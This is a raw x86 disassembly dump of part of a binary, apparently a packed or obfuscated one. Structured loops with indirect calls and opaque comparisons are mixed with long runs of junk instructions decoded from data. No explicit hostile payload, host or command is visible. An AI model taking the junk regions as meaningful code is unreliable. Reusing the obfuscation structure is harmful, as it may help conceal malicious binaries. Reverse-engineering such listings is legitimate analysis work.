  4082bf:	jmp    0x40829a
  4082c1:	(bad)  [ebx+0x18]
  4082c4:	dec    ebp
  4082c5:	(bad)  
  4082c6:	enter  0x923d,0xb2
  4082ca:	add    ch,bl
  4082cc:	imul   edi,DWORD PTR [ecx-0x68],0xffffff81
  4082d0:	pop    edi
  4082d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082d2:	mov    WORD PTR [ebp+0x9a8fe3c],gs
  4082d8:	call   0x95bc:0x76be5db0
  4082df:	out    0xc3,eax
  4082e1:	jbe    0x408299
  4082e3:	sub    BYTE PTR [esi+0x41fb9ff0],0xb8
  4082ea:	test   al,0xed
  4082ec:	mov    edx,0xdf0a4a6d
  4082f1:	fst    QWORD PTR [edx-0x7f]
  4082f4:	sub    DWORD PTR [ebx],0x64
  4082f7:	dec    ecx
  4082f8:	jb     0x408350
  4082fa:	mov    DWORD PTR [ebp-0x17],0xd1be4645
  408301:	cmp    BYTE PTR [esi],al
  408303:	je     0x408320
  408305:	fwait
  408306:	out    dx,al
  408307:	cli    
  408308:	mov    esi,0xc8986a8f
  40830d:	sbb    BYTE PTR [ecx-0x557e6baf],dl
  408313:	test   DWORD PTR [edi-0x25],eax
  408316:	loope  0x4082a4
  408318:	call   0xa5a81cdd
  40831d:	js     0x408316
  40831f:	rcl    BYTE PTR [edi+ecx*4-0x50],1
  408323:	pop    es
  408324:	(bad)  [ebp+0x67]
  408327:	ret    0x349f
  40832a:	cmovl  esp,DWORD PTR [ebx+esi*1+0x7317a009]
  408332:	out    0x53,eax
  408334:	idiv   BYTE PTR [edx-0x19d5b10]
  40833a:	aas    
  40833b:	test   eax,0xd2a2e1d6
  408340:	xor    DWORD PTR [eax],edx
  408342:	(bad)  
  408343:	neg    BYTE PTR [edx+0x71240727]
  408349:	lods   eax,DWORD PTR ds:[esi]
  40834a:	dec    edi
  40834b:	mov    WORD PTR [ebp+0x3565589c],es
  408351:	add    ecx,DWORD PTR [ebx+0x7cbdc42e]
  408357:	sub    al,0x8
  408359:	aad    0xc3
  40835b:	mov    ebx,0x15fadf8
  408360:	inc    ebp
  408361:	sbb    BYTE PTR [ebp+0x3a560492],ch
  408367:	imul   eax,DWORD PTR [edi],0xfffffff2
  40836a:	mov    al,ds:0x76f1e864
  40836f:	mov    esp,0x1f63ca78
  408374:	pop    ebx
  408375:	ret    
  408376:	int    0x47
  408378:	mov    bl,ah
  40837a:	inc    eax
  40837b:	iret   
  40837c:	push   ds
  40837d:	cmp    DWORD PTR [edx-0x77],edx
  408380:	mov    dl,0xb7
  408382:	in     al,dx
  408383:	pushf  
  408384:	xlat   BYTE PTR ds:[ebx]
  408385:	shl    BYTE PTR [eax+0x3e],1
  408388:	cs ins BYTE PTR es:[edi],dx
  40838a:	and    bh,BYTE PTR [ebp-0x4f673b2]
  408390:	pop    ebx
  408391:	and    bh,al
  408393:	imul   eax,DWORD PTR [eax],0xe2209b21
  408399:	push   edi
  40839a:	and    DWORD PTR [ebx+0x16],esi
  40839d:	sbb    eax,DWORD PTR [edx]
  40839f:	icebp  
  4083a0:	int3   
  4083a1:	jmp    0x54bd:0x29bae5e9
  4083a8:	push   ebx
  4083a9:	adc    esi,DWORD PTR [edx]
  4083ab:	repnz cmp bh,BYTE PTR [eax-0x5b1db718]
  4083b2:	pop    ecx
  4083b3:	repz retf 
  4083b5:	stc    
  4083b6:	mov    esi,0x5d15520d
  4083bb:	stc    
  4083bc:	sub    BYTE PTR [ebx+0x2aeeba2],bl
  4083c2:	rcr    DWORD PTR [edx-0x25],0x8f
  4083c6:	sbb    ch,BYTE PTR [ebx-0x42]
  4083c9:	jmp    0xbb7b2817
  4083ce:	sar    DWORD PTR [ebx+0x38ccefe3],1
  4083d4:	lods   al,BYTE PTR ds:[esi]
  4083d5:	in     al,dx
  4083d6:	pop    es
  4083d7:	ins    DWORD PTR es:[edi],dx
  4083d8:	jmp    0x3152:0x443ed632
  4083df:	(bad)  
  4083e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083e1:	mov    ds:0x6b5555a3,al
  4083e6:	(bad)  
  4083e7:	mov    ecx,0x1f7469a0
  4083ec:	pop    ds
  4083ed:	cmp    al,dh
  4083ef:	sbb    bh,BYTE PTR [ebp-0x1f]
  4083f2:	push   eax
  4083f3:	sub    edi,DWORD PTR [esi+0x2d355995]
  4083f9:	fs cmp dh,al
  4083fc:	lods   eax,DWORD PTR ds:[esi]
  4083fd:	pop    ds
  4083fe:	out    0x69,eax
  408400:	and    eax,0x80bc06a2
  408406:	imul   edx,esi,0xd36d4c8
  40840c:	xchg   DWORD PTR [edi+0x73da7ad1],edi
  408412:	sub    BYTE PTR [ebp+esi*1-0x57],ch
  408416:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408417:	push   0xf1a6c41
  40841c:	mov    dh,0x39
  40841e:	cmp    al,0xdc
  408420:	sub    DWORD PTR [eax],ebx
  408422:	xchg   ebx,eax
  408423:	mov    cl,0x70
  408425:	loope  0x40840d
  408427:	inc    ebp
  408428:	push   0x18
  40842a:	sbb    BYTE PTR [ebx+ecx*8+0x6b],0x91
  40842f:	jle    0x40846d
  408431:	jb     0x408406
  408433:	mov    esi,0x54b96627
  408438:	jge    0x4084aa
  40843a:	mov    edi,ds
  40843c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40843d:	ret    
  40843e:	std    
  40843f:	imul   ebx,ebp,0x24
  408442:	mov    ah,BYTE PTR [edi]
  408444:	mov    al,0x1
  408446:	stc    
  408447:	dec    edi
  408448:	jb     0x40842c
  40844a:	(bad)  
  40844b:	xchg   esi,eax
  40844c:	push   ecx
  40844d:	sbb    BYTE PTR [edx],dh
  40844f:	mov    edx,0x9612563f
  408454:	mov    dl,0x3f
  408456:	rcr    ch,cl
  408458:	pop    es
  408459:	or     eax,0xe19fe988
  40845e:	mov    eax,0x143c184
  408463:	pop    ebx
  408464:	mov    cl,0x43
  408466:	pop    esi
  408467:	mov    ch,0x72
  408469:	push   eax
  40846a:	das    
  40846b:	hlt    
  40846c:	sbb    BYTE PTR [esp+edi*1],dl
  40846f:	add    eax,0x44f702d5
  408474:	adc    eax,0xb6136149
  408479:	out    0x34,eax
  40847b:	aas    
  40847c:	mov    ch,0x8e
  40847e:	cmp    edi,ecx
  408480:	stos   BYTE PTR es:[edi],al
  408481:	adc    BYTE PTR [edi+ecx*1-0x7e],bh
  408485:	imul   ebx,DWORD PTR [eax],0x558b0000
  40848b:	fadd   DWORD PTR [ecx+0x56c5df]
  408491:	add    BYTE PTR [ebx+0x1d33fc7d],cl
  408497:	(bad)  
  408498:	sub    eax,0xd0330043
  40849d:	and    DWORD PTR ds:0x434411,0x0
  4084a7:	jmp    0x4084bb
  4084ac:	xor    ebx,ebx
  4084ae:	xor    ebx,DWORD PTR ds:0x434411
  4084b4:	inc    ebx
  4084b5:	mov    DWORD PTR ds:0x434411,ebx
  4084bb:	cmp    DWORD PTR ds:0x434411,0x18
  4084c2:	jae    0x4084e3
  4084c8:	cmp    DWORD PTR ds:0x434411,0x22
  4084cf:	jne    0x4084de
  4084d5:	push   DWORD PTR [ebp-0x1c]
  4084d8:	call   DWORD PTR ds:0x432c42
  4084de:	jmp    0x4084ac
  4084e3:	xor    edi,eax
  4084e5:	add    edi,ecx
  4084e7:	mov    ebx,DWORD PTR ds:0x43441d
  4084ed:	add    DWORD PTR ds:0x432dca,ebx
  4084f3:	add    edx,ecx
  4084f5:	add    DWORD PTR ds:0x434366,ecx
  4084fb:	imul   edx,edi
  4084fe:	mov    edi,DWORD PTR [ebp-0x8]
  408501:	mov    ebx,DWORD PTR ds:0x43442d
  408507:	or     DWORD PTR ds:0x434419,ebx
  40850d:	mov    ebx,DWORD PTR [ebp-0x10]
  408510:	sub    ebx,edi
  408512:	cmp    ebx,edx
  408514:	mov    DWORD PTR ds:0x434425,0x4da5
  40851e:	ja     0x40879c
  408524:	and    DWORD PTR ds:0x4326fc,0x0
  40852e:	jmp    0x408540
  408533:	mov    edx,DWORD PTR ds:0x4326fc
  408539:	inc    edx
  40853a:	mov    DWORD PTR ds:0x4326fc,edx
  408540:	cmp    DWORD PTR ds:0x4326fc,0x1b
  408547:	jae    0x408786
  40854d:	cmp    DWORD PTR ds:0x4326fc,0x1d
  408554:	jne    0x408563
  40855a:	push   DWORD PTR [ebp-0x28]
  40855d:	call   DWORD PTR ds:0x4329d2
  408563:	jmp    0x408533
  408568:	adc    DWORD PTR ds:0x432dc6,0x7927
  408572:	jmp    0x408786
  408577:	rcr    DWORD PTR [ebp-0xc8d3cb2],0x51
  40857e:	popf   
  40857f:	push   es
  408580:	stos   DWORD PTR es:[edi],eax
  408581:	arpl   bp,sp
  408583:	sahf   
  408584:	ds cld 
  408586:	mov    ebp,DWORD PTR [eax+0x697070d4]
  40858c:	jg     0x4085fe
  40858e:	jo     0x40852f
  408590:	outs   dx,BYTE PTR ds:[esi]
  408591:	xor    eax,0x198d60f
  408596:	jae    0x408526
  408598:	jns    0x408550
  40859a:	(bad)  
  40859b:	push   ebx
  40859c:	xor    DWORD PTR [ecx-0x4aad3ee2],ebx
  4085a2:	mov    dl,0x8f
  4085a4:	cli    
  4085a5:	xchg   ebp,eax
  4085a6:	pop    ebp
  4085a7:	(bad)  
  4085a8:	cmp    eax,0x4690b169
  4085ad:	imul   eax,DWORD PTR ds:0x256e85e9,0x55
  4085b4:	inc    edx
  4085b5:	mov    esp,0x468b668c
  4085ba:	cwde   
  4085bb:	add    eax,0xf3d7d6dc
  4085c0:	adc    BYTE PTR gs:[ecx+0x35],cl
  4085c4:	sar    dl,0x43
  4085c7:	sti    
  4085c8:	cdq    
  4085c9:	pop    ss
  4085ca:	mov    ds:0x70343f99,eax
  4085cf:	mov    eax,ds:0xe60bb5f2
  4085d4:	imul   eax,DWORD PTR [edx-0x33],0x99013356
  4085db:	mov    ah,0x95
  4085dd:	inc    edi
  4085de:	jl     0x40858a
  4085e0:	adc    DWORD PTR gs:[edi-0x611e3976],ebx
  4085e7:	ds das 
  4085e9:	mov    ebp,0x870776c3
  4085ee:	sbb    BYTE PTR [ebx],0xc2
  4085f1:	fld    TBYTE PTR [ebx-0x3c76648]
  4085f7:	add    BYTE PTR [ebp-0x43],bl
  4085fa:	pop    ecx
  4085fb:	fistp  QWORD PTR [ecx+0x6111277b]
  408601:	xor    DWORD PTR [ecx+0x61d6ebf],edi
  408607:	ja     0x40861b
  408609:	or     dh,BYTE PTR [eax+0x66]
  40860c:	dec    edi
  40860d:	sbb    eax,0x302b5398
  408612:	mov    eax,0xb0e5bd38
  408617:	sub    DWORD PTR [eax+0x797b5cb3],esi
  40861d:	push   cs
  40861e:	inc    esp
  40861f:	cmp    eax,edi
  408621:	outs   dx,DWORD PTR ds:[esi]
  408622:	std    
  408623:	xchg   edi,eax
  408624:	sbb    al,0x75
  408626:	jae    0x408625
  408628:	mov    esp,edx
  40862a:	dec    eax
  40862b:	and    bl,bl
  40862d:	dec    esp
  40862e:	das    
  40862f:	call   0x1ed8536b
  408634:	add    ecx,eax
  408636:	popa   
  408637:	xchg   ecx,eax
  408638:	mov    bl,0x72
  40863a:	jp     0x408610
  40863c:	(bad)  
  40863d:	dec    ecx
  40863e:	add    bh,BYTE PTR [edi-0x39fa5d80]
  408644:	add    al,0x85
  408646:	ret    
  408647:	popa   
  408648:	or     BYTE PTR [edx-0x15],bl
  40864b:	pop    ebp
  40864c:	fcmove st,st(4)
  40864e:	add    eax,0x6f91793e
  408653:	test   DWORD PTR [ecx+0x776fbb90],eax
  408659:	mov    eax,0xa6009353
  40865e:	or     esi,DWORD PTR [bx+0x517b]
  408663:	fistp  QWORD PTR [ebx]
  408665:	ret    
  408666:	cld    
  408667:	stos   DWORD PTR es:[edi],eax
  408668:	call   0xc6ffd848
  40866d:	xlat   BYTE PTR ds:[ebx]
  40866e:	inc    ecx
  40866f:	mov    edx,0x2b552c7d
  408674:	and    ch,BYTE PTR [edi-0x46]
  408677:	call   0x36deae0c
  40867c:	mov    edx,0xb69b273e
  408682:	add    al,0x2a
  408684:	jge    0x4086fe
  408686:	ret    0x62d9
  408689:	fwait
  40868a:	cmp    edi,edx
  40868c:	mov    ?,WORD PTR [ebx]
  40868e:	dec    eax
  40868f:	out    0x60,eax
  408691:	in     al,dx
  408692:	mov    dh,ch
  408694:	leave  
  408695:	add    DWORD PTR [ecx-0x77],esi
  408698:	jo     0x408712
  40869a:	or     ebp,DWORD PTR [ecx+0x5490131f]
  4086a0:	lods   eax,DWORD PTR ds:[esi]
  4086a1:	inc    ecx
  4086a2:	dec    edx
  4086a3:	push   cs
  4086a4:	sub    ebp,DWORD PTR [eax-0x4]
  4086a7:	popf   
  4086a8:	add    eax,0xc35000a1
  4086ad:	dec    ecx
  4086ae:	icebp  
  4086af:	mov    ss,WORD PTR [edx-0x77d2054c]
  4086b5:	cld    
  4086b6:	mov    dh,0x6c
  4086b8:	mov    bh,0x81
  4086ba:	pop    ebp
  4086bb:	or     edx,ecx
  4086bd:	sbb    al,0x40
  4086bf:	mov    dl,0x2
  4086c1:	in     eax,dx
  4086c2:	retf   
  4086c3:	stc    
  4086c4:	xor    ebp,DWORD PTR [bp+si+0x3e48]
  4086c9:	mov    ds:0xe9934f15,eax
  4086ce:	and    al,0xac
  4086d0:	cli    
  4086d1:	in     eax,0xb3
  4086d3:	push   es
  4086d4:	and    BYTE PTR [ecx-0x26],0x4d
  4086d8:	mov    ds:0xf0fc3a97,eax
  4086dd:	inc    esp
  4086de:	daa    
  4086df:	and    al,0x61
  4086e1:	(bad)  
  4086e2:	push   eax
  4086e3:	or     eax,0x45bbff0b
  4086e8:	rep stos DWORD PTR es:[di],eax
  4086eb:	dec    ecx
  4086ec:	vpgatherdd xmm4,DWORD PTR [edx+0x3f9421d7],xmm0
  4086f5:	jbe    0x4086bd
  4086f7:	iret   
  4086f8:	mov    ds:0x36910a10,al
  4086fd:	test   eax,0x5897ad3b
  408702:	dec    ecx
  408703:	push   edx
  408704:	mov    ds:0xd484437c,eax
  408709:	jno    0x40876c
  40870b:	push   ecx
  40870c:	adc    BYTE PTR [eax],cl
  40870e:	xchg   edi,edi
  408710:	add    ebp,DWORD PTR [edi+0x30]
  408713:	jnp    0x408770
  408715:	cmp    esp,edx
  408717:	push   ebx
  408718:	push   cs
  408719:	into   
  40871a:	mov    dl,dh
  40871c:	sub    ebx,DWORD PTR [edi+0x78]
  40871f:	inc    ebp
  408720:	dec    ebp
  408721:	(bad)  
  408723:	imul   esp,DWORD PTR [eax+edi*2-0x68],0x639b309d
  40872b:	div    DWORD PTR [edx]
  40872d:	outs   dx,BYTE PTR ds:[esi]
  40872e:	loopne 0x40873b
  408730:	std    
  408731:	pop    es
  408732:	enter  0x7298,0x37
  408736:	sub    edx,DWORD PTR [esi+0x1e]
  408739:	cmp    al,0xe1
  40873b:	aad    0x62
  40873d:	mov    ebx,0x1ca03694
  408742:	jle    0x4086ee
  408744:	lods   eax,DWORD PTR ds:[esi]
  408745:	sbb    ecx,DWORD PTR [ebx-0x60]
  408748:	sub    DWORD PTR [edi],esp
  40874a:	shl    DWORD PTR [eax],1
  40874c:	add    al,0x32
  40874e:	lods   al,BYTE PTR ds:[esi]
  40874f:	cmc    
  408750:	sti    
  408751:	sbb    eax,0xdcc0d638
  408756:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408757:	jecxz  0x4087af
  408759:	jo     0x40871f
  40875b:	pop    es
  40875c:	mov    ss:0x38a8a2e,al
  408762:	push   0x9717f839
  408767:	loope  0x408793
  408769:	cmp    DWORD PTR [ecx+ebx*1-0x417bc1ff],esp
  408770:	add    DWORD PTR [ebp+eiz*2-0x3a99b3eb],esp
  408777:	ret    0x1b17
  40877a:	sahf   
  40877b:	mov    esi,0x90d38986
  408780:	aam    0x39
  408782:	adc    al,0x8a
  408784:	xchg   ebp,eax
  408785:	ror    DWORD PTR [ebx-0x2fcc03ab],cl
  40878b:	add    edx,ecx
  40878d:	mov    DWORD PTR ds:0x43438a,0x22ee
  408797:	jmp    0x408b38
  40879c:	and    edx,edi
  40879e:	mov    edx,DWORD PTR [ebp-0x2c]
  4087a1:	or     edi,edi
  4087a3:	mov    edi,DWORD PTR [ebp-0x4]
  4087a6:	xor    edx,eax
  4087a8:	not    ebx
  4087aa:	xor    edi,eax
  4087ac:	sub    DWORD PTR ds:0x43438a,0x43441d
  4087b6:	add    edi,ecx
  4087b8:	or     ebx,DWORD PTR ds:0x434415
  4087be:	add    edx,ecx
  4087c0:	or     DWORD PTR ds:0x43438e,edi
  4087c6:	imul   edx,edi
  4087c9:	adc    DWORD PTR ds:0x434415,ebx
  4087cf:	mov    edi,DWORD PTR [ebp-0x8]
  4087d2:	sub    ebx,0x42e0
  4087d8:	mov    ebx,DWORD PTR [ebp-0x10]
  4087db:	and    DWORD PTR ds:0x434372,0x1110
  4087e5:	sub    ebx,edi
  4087e7:	cmp    ebx,edx
  4087e9:	mov    DWORD PTR ds:0x432708,0x5f46
  4087f3:	ja     0x40880b
  4087f9:	mov    edx,DWORD PTR [ebp-0x28]
  4087fc:	mov    DWORD PTR ds:0x434425,0x1e0
  408806:	jmp    0x408b2a
  40880b:	mov    edx,DWORD PTR [ebp-0x30]
  40880e:	mov    edi,DWORD PTR [ebp-0x4]
  408811:	xor    DWORD PTR ds:0x432dd2,ecx
  408817:	xor    edx,eax
  408819:	mov    DWORD PTR ds:0x43436a,0x13
  408823:	cmp    DWORD PTR ds:0x43436a,0x0
  40882a:	je     0x40887c
  408830:	cmp    DWORD PTR ds:0x43436a,0x4
  408837:	jne    0x40884e
  40883d:	push   0x43287d
  408842:	push   DWORD PTR [ebp-0x20]
  408845:	push   DWORD PTR [ebp-0xc]
  408848:	call   DWORD PTR ds:0x432cfa
  40884e:	cmp    DWORD PTR ds:0x43436a,0x5
  408855:	jne    0x40886a
  40885b:	xor    ebx,ebx
  40885d:	add    ebx,DWORD PTR ds:0x43436a
  408863:	dec    ebx
  408864:	mov    DWORD PTR ds:0x43436a,ebx
  40886a:	mov    ebx,DWORD PTR ds:0x43436a
  408870:	dec    ebx
  408871:	mov    DWORD PTR ds:0x43436a,ebx
  408877:	jmp    0x408823
  40887c:	xor    edi,eax
  40887e:	add    edi,ecx
  408880:	add    edx,ecx
  408882:	imul   edx,edi
  408885:	mov    edi,DWORD PTR [ebp-0x8]
  408888:	mov    ebx,DWORD PTR [ebp-0x10]
  40888b:	sub    ebx,edi
  40888d:	cmp    ebx,edx
  40888f:	ja     0x40889d
  408895:	mov    edx,DWORD PTR [ebp-0x2c]
  408898:	jmp    0x408b2a
  40889d:	mov    edx,DWORD PTR [ebp-0x34]
  4088a0:	mov    edi,DWORD PTR [ebp-0x4]
  4088a3:	xor    edx,eax
  4088a5:	xor    edi,eax
  4088a7:	add    edi,ecx
  4088a9:	add    edx,ecx
  4088ab:	imul   edx,edi
  4088ae:	mov    edi,DWORD PTR [ebp-0x8]
  4088b1:	mov    ebx,DWORD PTR [ebp-0x10]
  4088b4:	sub    ebx,edi
  4088b6:	cmp    ebx,edx
  4088b8:	ja     0x4088c6
  4088be:	mov    edx,DWORD PTR [ebp-0x30]
  4088c1:	jmp    0x408b2a
  4088c6:	mov    edx,DWORD PTR [ebp-0x38]
  4088c9:	mov    edi,DWORD PTR [ebp-0x4]
  4088cc:	xor    edx,eax
  4088ce:	xor    edi,eax
  4088d0:	add    edi,ecx
  4088d2:	add    edx,ecx
  4088d4:	imul   edx,edi
  4088d7:	mov    edi,DWORD PTR [ebp-0x8]
  4088da:	mov    ebx,DWORD PTR [ebp-0x10]
  4088dd:	sub    ebx,edi
  4088df:	cmp    ebx,edx
  4088e1:	ja     0x4088ef
  4088e7:	mov    edx,DWORD PTR [ebp-0x34]
  4088ea:	jmp    0x408b2a
  4088ef:	mov    edx,DWORD PTR [ebp-0x3c]
  4088f2:	mov    edi,DWORD PTR [ebp-0x4]
  4088f5:	xor    edx,eax
  4088f7:	xor    edi,eax
  4088f9:	add    edx,ecx
  4088fb:	add    edi,ecx
  4088fd:	imul   edx,edi
  408900:	mov    edi,DWORD PTR [ebp-0x8]
  408903:	mov    ebx,DWORD PTR [ebp-0x10]
  408906:	sub    ebx,edi
  408908:	cmp    ebx,edx
  40890a:	mov    edx,DWORD PTR [ebp-0x38]
  40890d:	jbe    0x408b2a
  408913:	mov    edx,DWORD PTR [ebp-0x3c]
  408916:	jmp    0x408b2a
  40891b:	imul   ebx,DWORD PTR [edx-0x5eb67e05],0x71
  408922:	jb     0x40895b
  408924:	adc    esi,DWORD PTR [ebx-0x73e78eb5]
  40892a:	shl    DWORD PTR [ecx+0x697070d2],cl
  408930:	jg     0x4089a2
  408932:	jo     0x4088d1
  408934:	mov    edi,0x3d3e596e
  408939:	xchg   edx,eax
  40893a:	push   ebx
  40893b:	rol    BYTE PTR [ebx+ebx*8+0x7f],1
  40893f:	jg     0x4088ce
  408941:	addr16 jmp 0x408983
  408944:	mov    al,0xe
  408946:	xor    al,0x91
  408948:	push   ss
  408949:	mov    esp,0xf2627736
  40894e:	and    cl,BYTE PTR [edi+0x23d996bb]
  408954:	sar    BYTE PTR [edx+0x9],cl
  408957:	dec    esi
  408958:	jl     0x40897e
  40895a:	sbb    al,0xc2
  40895c:	pop    eax
  40895d:	push   ebp
  40895e:	xlat   BYTE PTR ds:[ebx]
  40895f:	aam    0x6b
  408961:	adc    ebx,edx
  408963:	cmp    eax,0x9a091c0c
  408968:	sar    edx,0x1a
  40896b:	int    0xa8
  40896d:	mov    bh,ah
  40896f:	imul   ecx,DWORD PTR [esi+0x4f],0xffffffb3
  408973:	fimul  WORD PTR [edx-0x3911247b]
  408979:	out    dx,al
  40897a:	arpl   WORD PTR [edx],bp
  40897c:	xor    al,0x25
  40897e:	ins    DWORD PTR es:[edi],dx
  40897f:	shl    DWORD PTR [esi+ebp*2],1
  408982:	cli    
  408983:	cdq    
  408984:	ja     0x408938
  408986:	cmp    bl,BYTE PTR [eax]
  408988:	pop    ecx
  408989:	lahf   
  40898a:	repnz pop ss
  40898c:	push   cs
  40898d:	jns    0x4089ed
  40898f:	xor    al,0x97
  408991:	repnz xor eax,0xd499fdce
  408997:	sub    ch,BYTE PTR [esi]
  408999:	outs   dx,BYTE PTR ds:[esi]
  40899a:	mov    esp,0xdac8bd14
  40899f:	adc    esi,eax
  4089a1:	inc    esi
  4089a2:	dec    eax
  4089a3:	jbe    0x408956
  4089a5:	out    dx,al
  4089a6:	sub    ecx,ecx
  4089a8:	and    al,0x4f
  4089aa:	and    dh,ch
  4089ac:	aad    0x88
  4089ae:	sub    DWORD PTR [ebx],edx
  4089b0:	cs dec ebx
  4089b2:	push   edx
  4089b3:	xchg   edi,eax
  4089b4:	lds    edx,FWORD PTR [ecx-0x1e224dae]
  4089ba:	sub    eax,0xf6f3fe50
  4089bf:	xchg   esp,eax
  4089c0:	mov    edi,0x9b205a10
  4089c5:	and    BYTE PTR ds:0xbccdc7e5,cl
  4089cb:	sbb    DWORD PTR [ecx+ecx*2+0x6d],esi
  4089cf:	retf   0x8e62
  4089d2:	sbb    BYTE PTR [ebx],al
  4089d4:	add    eax,0x97879edd
  4089d9:	rcl    BYTE PTR [eax-0x3f],1
  4089dc:	lds    edx,FWORD PTR [ebp*8-0x79489adb]
  4089e3:	call   0x78bc:0xbba10682
  4089ea:	pusha  
  4089eb:	aam    0xae
  4089ed:	cmp    eax,0xffffffbf
  4089f0:	inc    eax
  4089f1:	mov    ah,0x10
  4089f3:	lods   al,BYTE PTR ds:[esi]
  4089f4:	scas   al,BYTE PTR es:[edi]
  4089f5:	or     eax,DWORD PTR [esi+0x76]
  4089f8:	push   0x87cd2b47
  4089fd:	enter  0xe9e5,0x20
  408a01:	inc    edx
  408a02:	bound  esp,QWORD PTR [edx-0xf]
  408a05:	and    BYTE PTR [edi],0x90
  408a08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a09:	lea    eax,[edi-0x45]
  408a0c:	ror    edi,cl
  408a0e:	f2xm1  
  408a10:	xor    BYTE PTR [ecx+edx*4+0x6e56225e],ah
  408a17:	push   ecx
  408a18:	test   eax,0x9aabd598
  408a1d:	test   esp,ebp
  408a1f:	jbe    0x408a99
  408a21:	sub    eax,0xd045a646
  408a26:	mov    DWORD PTR [esi],eax
  408a28:	mov    DWORD PTR ds:0x59db9cc6,ebx
  408a2f:	in     eax,dx
  408a30:	jecxz  0x4089c7
  408a32:	and    esi,ebp
  408a34:	sub    al,0x53
  408a36:	mov    BYTE PTR [edx],bl
  408a38:	lods   eax,DWORD PTR ds:[esi]
  408a39:	mov    eax,ds:0x450ff900
  408a3e:	jns    0x4089f0
  408a40:	mov    esp,0x3dca3766
  408a45:	pop    ss
  408a46:	fcmovne st,st(7)
  408a48:	adc    BYTE PTR [eax+0x7ee4032e],0x30
  408a4f:	jae    0x408aa7
  408a51:	bound  esp,QWORD PTR [edi]
  408a53:	adc    ebx,DWORD PTR fs:[ebx-0x5dbaa439]
  408a5a:	ffreep st(6)
  408a5c:	(bad)  
  408a5d:	call   DWORD PTR [ebx]
  408a5f:	jmp    0x408a3c
  408a61:	aam    0xef
  408a63:	dec    edi
  408a64:	or     ch,0xb9
  408a67:	imul   edx,DWORD PTR [edx],0xffffffd9
  408a6a:	fsub   DWORD PTR [ebp+0x34]
  408a6d:	addr16 xor al,0xc1
  408a70:	test   BYTE PTR ds:0x3decbd80,cl
  408a76:	or     eax,ebp
  408a78:	cs inc ecx
  408a7a:	sbb    al,0xe5
  408a7c:	add    DWORD PTR [ecx+0x7f7389],esi
  408a82:	mov    esp,0x747b93b3
  408a87:	dec    ebx
  408a89:	xor    ebx,esp
  408a8b:	jno    0x408aa4
  408a8d:	adc    eax,0x4399223a
  408a92:	dec    ebx
  408a93:	push   ebp
  408a94:	clc    
  408a95:	xor    al,0xb1
  408a97:	nop
  408a98:	stos   BYTE PTR es:[edi],al
  408a99:	ss sub edx,edx
  408a9c:	out    0xfd,eax
  408a9e:	dec    ebx
  408a9f:	cmp    BYTE PTR cs:[edx],bh
  408aa2:	xchg   ebp,eax
  408aa3:	pop    ecx
  408aa4:	mov    edi,0xa44542f6
  408aa9:	lock sbb DWORD PTR [ecx-0x47388e8e],esi
  408ab0:	xchg   ebp,eax
  408ab1:	outs   dx,BYTE PTR ds:[esi]
  408ab2:	sub    eax,0x39e1d4f2
  408ab7:	sbb    cl,BYTE PTR ds:0x7de1160e
  408abd:	mov    edx,0x807a09f3
  408ac2:	add    ecx,ebx
  408ac4:	bound  ecx,QWORD PTR [ebp+0x32a32a4d]
  408aca:	mov    dl,BYTE PTR [eax-0x2672f92a]
  408ad0:	and    BYTE PTR [ebx],0xac
  408ad3:	je     0x408ab4
  408ad5:	mov    bh,0x50
  408ad7:	mov    ds:0x1d74e6f0,eax
  408adc:	sub    eax,0x2aad110
  408ae1:	int    0x8e
  408ae3:	add    al,0x62
  408ae5:	jb     0x408ab8
  408ae7:	inc    edx
  408ae9:	mov    dh,0xdb
  408aeb:	stc    
  408aec:	adc    eax,0xecc0c024
  408af1:	lods   eax,DWORD PTR ds:[esi]
  408af2:	push   esi
  408af3:	shr    DWORD PTR [esi+0xf],cl
  408af6:	in     eax,dx
  408af7:	mov    eax,0xc01e9dc8
  408afc:	mov    bh,bl
  408afe:	xchg   esi,eax
  408aff:	mov    cs,WORD PTR [eax]
  408b01:	ret    0xd177
  408b04:	add    BYTE PTR [edx],cl
  408b06:	(bad)  
  408b07:	outs   dx,DWORD PTR ds:[esi]
  408b08:	jbe    0x408ab4
  408b0a:	push   es
  408b0b:	mov    eax,ds:0x4b0334d7
  408b10:	xor    al,0xa3
  408b12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b13:	add    al,0x71
  408b15:	adc    al,0xd
  408b17:	test   eax,0x291a69f4
  408b1c:	sub    al,0xd8
  408b1e:	or     BYTE PTR [esi+0x260cc8f3],bl
  408b24:	inc    edi
  408b25:	daa    
  408b26:	push   esi
  408b27:	push   es
  408b28:	push   0xfc7d8b22
  408b2d:	xor    edi,eax
  408b2f:	xor    edx,eax
  408b31:	add    edi,ecx
  408b33:	add    edx,ecx
  408b35:	imul   edx,edi
  408b38:	mov    DWORD PTR [ebp+0xc],edx
  408b3b:	mov    edx,DWORD PTR [ebp+0xc]
  408b3e:	mov    DWORD PTR [ebp-0x24],edx
  408b41:	mov    edx,DWORD PTR [ebp-0x8]
  408b44:	add    edx,DWORD PTR [ebp-0x40]
  408b47:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  408b4e:	mov    DWORD PTR [ebp-0x1c],edx
  408b51:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  408b58:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  408b5f:	mov    edx,DWORD PTR [ebp-0x18]
  408b62:	xor    edx,eax
  408b64:	add    edx,ecx
  408b66:	jmp    0x409637
  408b6b:	mov    edx,DWORD PTR [ebp-0x18]
  408b6e:	xor    edx,eax
  408b70:	add    edx,DWORD PTR [ebp-0x14]
  408b73:	mov    edi,DWORD PTR [ebp-0x1c]
  408b76:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  408b7d:	mov    BYTE PTR [ebp+0xf],dl
  408b80:	jmp    0x408d94
  408b85:	arpl   WORD PTR [ecx+edx*8+0x7359f11a],dx
  408b8c:	push   ecx
  408b8d:	out    0xb0,eax
  408b8f:	jnp    0x408bf2
  408b91:	mov    esp,0x9ab664e3
  408b96:	shl    BYTE PTR [eax+0x70],1
  408b99:	imul   edi,DWORD PTR [edi+0x70],0xab690b70
  408ba0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ba1:	xor    eax,0xd468ec93
